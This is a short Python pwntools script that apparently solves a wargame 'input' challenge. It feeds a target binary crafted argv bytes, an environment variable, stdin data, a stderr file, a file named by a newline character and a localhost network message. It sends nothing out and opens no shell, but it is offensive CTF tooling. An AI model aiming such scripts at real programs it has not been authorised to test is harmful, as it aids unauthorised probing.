from pwn import *

ex = ["A" for i in range(100)]
ex[ord('A')] = "\x00"
ex[ord('B')] = "\x20\x0a\x0d"
ex[ord('C')] = '55174'

en = {"\xde\xad\xbe\xef":"\xca\xfe\xba\xbe"}
with open("tt",'w') as f:
	f.write("\x00\x0a\x02\xff")
	f.close()
with open("\x0a",'w') as f:
	f.write("\x00\x00\x00\x00")
	f.close()

p = process(executable='/home/input2/input',argv=ex,stderr=open('tt'), env=en)
p.sendline("\x00\x0a\x00\xff")

print p.recv()

tar = remote('localhost',55174)
tar.send("\xde\xad\xbe\xef")

p.interactive()

